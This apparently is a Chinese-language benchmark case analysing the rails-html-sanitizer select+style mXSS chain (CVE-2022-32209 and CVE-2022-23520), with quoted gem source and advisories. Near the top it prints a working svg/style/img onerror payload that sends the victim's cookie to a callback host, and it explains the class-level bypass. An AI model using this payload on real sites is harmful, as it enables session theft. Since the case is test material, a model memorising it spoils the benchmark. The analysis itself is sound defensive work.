# rails-html-sanitizer：select+style 组合只从 :tags 参数里抠掉

- Case：`PCBV2-0182`
- 产品：`rails-html-sanitizer` gem（Rails `sanitize` helper 的后端）。运行时是 RubyGems 1.4.2 / 1.4.3 / 1.4.4，经 `Rails::Html::SafeListSanitizer#sanitize` 再交给真实 Chromium 渲染，loofah 2.19.1 + nokogiri 1.13.10 三版钉死。
- 链：CVE-2022-32209（1.4.2 → 1.4.3）→ CVE-2022-23520（1.4.3 → 1.4.4，GHSA-rrfc-7g8p-99q8）
- 源码对着 tag `v1.4.3` 的 `lib/rails/html/sanitizer.rb`（`allowed_tags` / `remove_safelist_tag_combinations`）和 tag `v1.4.4` 的 `lib/rails/html/scrubbers.rb`（`cdata_escape`）。金丝雀是受害浏览器 cookie `session=<flag>`，只有消毒后的 HTML 在浏览器里变异成可执行 `img onerror` 才会报到 callback。

GHSA-rrfc-7g8p-99q8：*due to an incomplete fix of CVE-2022-32209 ... may allow an attacker to inject content if the application developer has overridden the sanitizer's allowed tags to allow both "select" and "style" elements.* Dominic Breuker 写得更具体：*`remove_safelist_tag_combinations` does not apply to that [class-level] list.*

根因不只是「漏了配置入口」。检查插在「这次调用的 `options[:tags]` 里同不同意 select 和 style 共存」上；真正把字节交给浏览器的是 Loofah/Nokogiri 按 HTML4 序列化出来的 `<style>` CDATA。组合检查根本不碰 class 上的 `allowed_tags`。下面按 API 走进去。

---

## 这块功能本来在干什么

Rails 用 SafeListSanitizer 清洗不可信 HTML。默认允许的标签不含 `select`/`style`。应用可以：

1. 调用时传 `tags:`（Action View `sanitize @body, tags: [...]` 或 `sanitizer.sanitize(html, tags: [...])`）
2. 设 class：`Rails::Html::SafeListSanitizer.allowed_tags = [...]`
3. 设 `config.action_view.sanitized_allowed_tags`（最终也写到 class 变量）

文档写明：*Passed options take precedence over the class level options.*

一次典型清洗（本 case 为了触发 mXSS，allowlist 同时含 select、style、svg、math）：

```ruby
html = '<svg><style><img src=x onerror="document.location=\'//callback/?f=\'+document.cookie"></style></svg>'
Rails::Html::SafeListSanitizer.new.sanitize(html, tags: %w[select style svg math ...])
```

`sanitize` 把允许列表交给 `PermitScrubber`，Loofah 用 HTML4 解析器走一遍，再 `to_html`。HTML4 下 `<style>` 里的内容当 CDATA，`<img ...>` 可以原样出串。浏览器按 HTML5 再解析，foreign content（svg/math）里的 style 文本会被拉成真正的 `<img>`，`onerror` 执行。

设计意图：即便开发者同时允许 select 和 style，也不该发出能在浏览器里变异成事件处理程序的标记。成功穿越之后的效果是：**消毒结果里仍有未转义的 `<img onerror>`，受害页 cookie 出现在 callback。**

`img`/`script` 不在 allowlist。执行靠的是序列化与再解析不一致，不是允许了 img。

数据流：

```text
不可信 HTML
    → SafeListSanitizer#sanitize(html, options)
         allowed_tags(options)          ← V1 只在 options[:tags] 分支抠 style
         PermitScrubber.tags = ...
         Loofah.fragment(html).scrub!
         properly_encode → to_html      ← HTML4：style 内 CDATA 原样
    → 页面内嵌这段 HTML
    → Chromium HTML5 再解析
         svg/math foreign content 把 <img> 拉出 style
         onerror → callback?f=session=<flag>
```

---

## 原始漏洞：select+style 让 style 变成 CDATA 通道（CVE-2022-32209，1.4.2）

1.4.2 的 `allowed_tags` 原样返回调用方给的集合，没有组合规则：

```ruby
# lib/rails/html/sanitizer.rb  (v1.4.2)
      def allowed_tags(options)
        options[:tags] || self.class.allowed_tags
      end
```

HackerOne 1654310 / windshock：当 select 与 style 同时在 safelist 里，HTML4 解析器把 style 当 RAWTEXT/CDATA，里面的 `<img onerror>` 不会在服务端被当成标签剥掉，出串后浏览器再解析就会执行。CVE-2022-32209 写明四种覆盖方式都受影响：`config.action_view.sanitized_allowed_tags`、helper 的 `:tags`、class `allowed_tags=`、实例 `sanitize(..., tags:)`。

本 case seed 走 `tags:` 参数（32209 补丁明确加了组合检查的那条路）。V0 上 `<svg><style><img ...></style></svg>` 原样出串，Chromium 执行，callback 收到 flag。

loofah 2.19.1 没有 `Loofah.html5_mode?`，下面 V1 的 `!loofah_using_html5?` 为真，组合检查在 HTML4 路径上会启用——前提是它真的被调用。

---

## 维护者改了什么（CVE-2022-32209 修复，1.4.3）

1.4.3 加了 `remove_safelist_tag_combinations`，但只包在 `options[:tags]` 上：

```ruby
# lib/rails/html/sanitizer.rb  (v1.4.3)
      def loofah_using_html5?
        Loofah.respond_to?(:html5_mode?) && Loofah.html5_mode?
      end

      def remove_safelist_tag_combinations(tags)
        if !loofah_using_html5? && tags.include?("select") && tags.include?("style")
          warn("WARNING: #{self.class}: removing 'style' from safelist, should not be combined with 'select'")
          tags.delete("style")
        end
        tags
      end

      def allowed_tags(options)
        if options[:tags]
          remove_safelist_tag_combinations(options[:tags])
        else
          self.class.allowed_tags
        end
      end
```

字面意思：仅当这次调用带了 `:tags`，并且当前不是 HTML5 模式，并且两个标签都在列表里，才 `delete("style")`。class 变量那条 `else` **原样返回**。

对 seed（`sanitize(html, tags: [...select...style...])`）：style 被抠掉，Loofah 不再保留 `<style>`，img 文本被逃成 `&lt;img...&gt;` 或随 style 一起消失。浏览器没有可执行的 onerror。这就是 v1 + `--seed` 退出码 10。

补丁默认了两件事：

1. 危险组合只来自 per-call `:tags`。
2. 去掉 style 标签就够了（不修 CDATA 序列化）。

第一点不成立：Rails 文档推荐的 class-level / `config.action_view` 覆盖走 `else`。第二点把真正的 sink（HTML4 对 style 的 CDATA 出串）留着。

---

## 消毒之后，列表怎么接到序列化上

`sanitize` 不管 tags 从哪来，都是：

```ruby
        elsif allowed_tags(options) || allowed_attributes(options)
          @permit_scrubber.tags = allowed_tags(options)
          @permit_scrubber.attributes = allowed_attributes(options)
          loofah_fragment.scrub!(@permit_scrubber)
```

`PermitScrubber` 按这张表保留元素。style 若还在表里，HTML4 序列化器把子节点当 CDATA 写出——**没有**把 `<` 变成 `&lt;`。过滤器刚看过的是 Ruby 数组里有没有这两个字符串；浏览器看到的是出串后的字节。两套语义中间没有第二次谓词。

`loofah_using_html5?` 在 loofah 2.19.1 上为假，所以一旦组合检查被调用，它会真的 `delete("style")`。缺口不是「HTML5 模式把检查跳过」，是 class 路径根本不调用。本 case 把 loofah/nokogiri 钉死，就是为了让唯一变量落在 sanitizer gem 的 `allowed_tags` 分支上。

class 路径：

```ruby
Rails::Html::SafeListSanitizer.allowed_tags = %w[select style svg math ...]
sanitizer.sanitize(html)   # options[:tags] 为 nil
```

`allowed_tags` 走到 `else`，`remove_safelist_tag_combinations` 一次都不跑。同一段 `<svg><style><img onerror=...>` 原样出串。

---

## 仓库里已经有更强的检查，class 路径没用

`remove_safelist_tag_combinations` 就在同一个 class 的 private 区。谁调用它：

| 来源 | 是否经过组合检查？ |
|---|---|
| `sanitize(html, tags: array)` / helper `:tags` | 是 |
| `SafeListSanitizer.allowed_tags = array` 后 `sanitize(html)` | **否** |
| `config.action_view.sanitized_allowed_tags = array` | **否**（写入 class 变量） |

V1 等于给「这次调用的参数」加了组合规则，给「进程级默认表」没加。不是没有这个谓词，是 **`else` 分支没用**。

更底层的谓词是「CDATA 出串时转义 `<`」。1.4.3 的 `PermitScrubber#scrub` 仍是把 CDATA 换成文本节点或原样留下（视 loofah 版本）；1.4.4 才调用 `Loofah::HTML5::Scrub.cdata_escape`。V1 选择改 safelist，而不是改序列化。

---

## 这个补丁挡住了什么、没挡住什么

- `remove_safelist_tag_combinations`：看 **options[:tags]** 里是否同时有 select 和 style
- Nokogiri HTML4 `to_html`：看 style 里的 `<img>` 要不要当 CDATA 原样发出

只要 allowlist 从 class 来，第一行不跑，第二行仍发出 RAW img。payload 与 seed **相同**，只换 API 路径——这就是 23520 相对 32209 的缺口。Breuker 的 *A Tale of Two XSS* 记录的就是：升到 1.4.3 之后，用 `config.action_view` 的应用仍然中招。

平台用 svg+style 而不是裸 `select>style>img`：现代 Chromium 在 select 插入模式下会丢掉 img；foreign content 里才会拉出来执行。这仍是同一类「HTML4 CDATA-under-style vs HTML5」变异，class-level 缺口把它留在可达状态。

---

## 残余仍然走 SafeListSanitizer#sanitize（CVE-2022-23520）

没有换 payload、没有换 gem、没有换 loofah。还是同一段 SVG+style+img，只是：

```ruby
SafeListSanitizer.allowed_tags = [..., "select", "style", "svg", "math", ...]
sanitizer.sanitize(html)   # 不传 tags:
```

V1 的组合检查跳过；style 保留；CDATA 原样；Chromium 执行；callback 出现 `PCBFLAG_...`。

平台残余和 GHSA-rrfc-7g8p-99q8 是同一 sink：class-level 覆盖下的 select+style mXSS。advisory 写明 `:tags` 参数路径**不再**受 23520 影响——那正是 seed 被 V1 挡住的路径。

Breuker 的复现是：把 `config.action_view.sanitized_allowed_tags` 设成含 select 和 style，升到 1.4.3 之后 payload 仍执行。他读到的正是 `allowed_tags` 的 `if options[:tags] ... else self.class.allowed_tags`。本 case 用 class setter 而不是 Rails config，落到同一 `else`。

seed 与残余的 HTML 字节可以完全相同。V1 上 `sanitize(html, tags: list)` 发出 `&lt;img` 或丢掉 style；`allowed_tags=list; sanitize(html)` 发出 RAW `<img src=x onerror=...>`。差分只在 Ruby 调用约定，不在 payload 变换。

`tags.delete("style")` 还会 `warn`。class 路径连这句警告都没有，因为方法没被调用。日志里看不到「should not be combined」并不能说明应用没开 select+style。

---

## 后来又补了什么（CVE-2022-23520，1.4.4）

1.4.4 **删掉**了 `remove_safelist_tag_combinations` / `loofah_using_html5?`，`allowed_tags` 回到简单的 `options[:tags] || self.class.allowed_tags`。真正闭合在 `PermitScrubber#scrub`：

```ruby
# lib/rails/html/scrubbers.rb  (v1.4.4)
      def scrub(node)
        if Loofah::HTML5::Scrub.cdata_needs_escaping?(node)
          replacement = Loofah::HTML5::Scrub.cdata_escape(node)
          node.replace(replacement)
          return CONTINUE
        end
        ...
```

两条 API 路径上，style 里的 `<img` 都变成 `&lt;img`。浏览器再解析也只是文本。公开建议升到 1.4.4；workaround 是 allowlist 里不要同时留 select 和 style。

V2 改的是序列化层，不再依赖「调用方从哪设置 tags」。本 benchmark 的 v2 关闭这条 CDATA 残余。

---

## 从这条链还能看出什么

这些不是分类标签，只是顺着代码继续看时比较自然的问题。

**维护者改错了哪一层。**  
他们改的是 safelist 怎么读。真正逃到脚本的是 HTML4 CDATA 出串。V2 才改 scrubber。1.4.3 在错误的层做了不完整的组合删除。

**不是没有更好的谓词。**  
`remove_safelist_tag_combinations` 已经写好，只挂了一条赋值路径。从 1.4.3 的 diff 只能看到 `if options[:tags]`；要判断是否闭合，必须看到 `else self.class.allowed_tags` 以及 Rails 配置写入的是 class 变量。

**同一 payload、同一 `sanitize`，只换 tags 从哪来。**  
32209 的四条覆盖方式里，1.4.3 只修了带 `:tags` 的两条。

**组合删除治标。**  
svg/math + style 在 1.4.3 的谓词里根本没写（只查 select）。class 路径上它们仍然和 style 共存。V2 的 CDATA 转义不依赖标签对。

**金丝雀在 cookie 里是有意的。**  
服务端响应里没有 flag。能出现在 callback，说明浏览器执行了 onerror，不是反射。

**1.4.4 删掉组合检查不是回退漏洞。**  
V2 靠 `cdata_escape` 在序列化层闭合；select+style 可以重新共存，但 `<img` 变成文本。若只看 `sanitizer.rb` 的 `allowed_tags` 变回 `options[:tags] || class`，会误以为 1.4.4 撤销了 1.4.3。必须对着 `scrubbers.rb`。

**Rails 配置写入的是 class 变量。**  
`config.action_view.sanitized_allowed_tags=` 最终调用 `SafeListSanitizer.allowed_tags=`。GHSA-rrfc-7g8p-99q8 列的两种「仍受影响」机制，在 1.4.3 里是同一条 `else` 分支。

---

## 版本、入口、参考

| | gem | `allowed_tags` | CDATA 出串 | `:tags` seed | class `allowed_tags=` residual |
|---|---|---|---|---|---|
| V0 | 1.4.2 | 无组合检查 | RAW `<img>` | 执行 | （开着） |
| V1 | 1.4.3 | 只对 `options[:tags]` 删 style | 仍 RAW | style 被删，挡 | 跳过检查，执行 |
| V2 | 1.4.4 | 组合检查删除 | `cdata_escape` | 挡 | `&lt;img`，挡 |

- 包 API：`Rails::Html::SafeListSanitizer#sanitize(html, tags:)` 与 `SafeListSanitizer.allowed_tags=`
- [CVE-2022-32209](https://nvd.nist.gov/vuln/detail/CVE-2022-32209)（1.4.3 发行说明 / Ruby on Rails security）
- [CVE-2022-23520](https://nvd.nist.gov/vuln/detail/CVE-2022-23520)、[GHSA-rrfc-7g8p-99q8](https://github.com/rails/rails-html-sanitizer/security/advisories/GHSA-rrfc-7g8p-99q8)
- [Dominic Breuker: A Tale of Two XSS](https://dominicbreuker.com/post/a_tale_of_two_xss_in_rails_html_sanitizer/)、[HackerOne 1654310](https://hackerone.com/reports/1654310)
- V1 blob：[`sanitizer.rb@v1.4.3`](https://github.com/rails/rails-html-sanitizer/blob/v1.4.3/lib/rails/html/sanitizer.rb)
- V2：[`scrubbers.rb@v1.4.4`](https://github.com/rails/rails-html-sanitizer/blob/v1.4.4/lib/rails/html/scrubbers.rb)
